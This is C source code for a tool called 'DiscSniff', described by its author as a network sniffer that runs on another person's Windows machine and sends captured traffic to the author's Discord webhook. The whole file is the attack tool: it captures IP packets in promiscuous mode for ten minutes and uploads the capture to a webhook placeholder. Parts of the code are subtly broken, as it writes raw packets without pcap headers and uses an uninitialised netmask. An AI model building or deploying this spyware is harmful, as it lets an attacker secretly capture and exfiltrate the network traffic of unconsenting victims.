// Author: BuffBaby253
// Title: DiscSniff
// Description: A network sniffer that runs on any other Windows machine and sends the pcap files to your Discord Webhook

#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <curl/curl.h>

// Function to send the pcap file to Discord webhook
void send_to_discord(const char* filename, const char* webhook_url) {
    CURL *curl;
    CURLcode res;
    curl_mime *form = NULL;
    curl_mimepart *field = NULL;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if(curl) {
        form = curl_mime_init(curl);

        // Add the file
        field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, filename);

        // Set the URL for the webhook
        curl_easy_setopt(curl, CURLOPT_URL, webhook_url);

        // Add the form to the request
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        // Perform the request
        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        // Cleanup
        curl_mime_free(form);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

int main() {
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int i = 0;
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct tm *ltime;
    char timestr[16];
    struct pcap_pkthdr *header;
    const u_char *pkt_data;
    time_t local_tv_sec;
    struct bpf_program fcode;
    char packet_filter[] = "ip";
    bpf_u_int32 netmask;

    // Find the available devices
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }

    // Print the list of devices
    for (d = alldevs; d; d = d->next) {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");
    }

    // Open the device for capturing
    if ((adhandle = pcap_open_live(alldevs->name, 65536, 1, 1000, errbuf)) == NULL) {
        fprintf(stderr, "Unable to open the adapter. %s is not supported by WinPcap\n", alldevs->name);
        pcap_freealldevs(alldevs);
        return -1;
    }

    // Checking layers (supporting only ethernet for simplicity)
    if (pcap_datalink(adhandle) != DLT_EN10MB) {
        fprintf(stderr, "This program works only on Ethernet networks.\n");
        pcap_freealldevs(alldevs);
        return -1;
    }

    // Compile the filter
    if (pcap_compile(adhandle, &fcode, packet_filter, 1, netmask) < 0) {
        fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
        pcap_freealldevs(alldevs);
        return -1;
    }

    // Set the filter
    if (pcap_setfilter(adhandle, &fcode) < 0) {
        fprintf(stderr, "\nError setting the filter.\n");
        pcap_freealldevs(alldevs);
        return -1;
    }

    // Capture packets
    FILE *dumpfile = fopen("capture.pcap", "wb");
    if (dumpfile == NULL) {
        fprintf(stderr, "Unable to open output file.\n");
        pcap_freealldevs(alldevs);
        return -1;
    }

    // Start timer
    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < 600) { // Capture for 10 minutes
        int res = pcap_next_ex(adhandle, &header, &pkt_data);
        if (res == 1) {
            fwrite(pkt_data, 1, header->len, dumpfile);
        }
    }

    fclose(dumpfile);
    pcap_freealldevs(alldevs);

    // Send the pcap file to the Discord webhook
    send_to_discord("capture.pcap", "YOUR_DISCORD_WEBHOOK_URL");

    return 0;
}
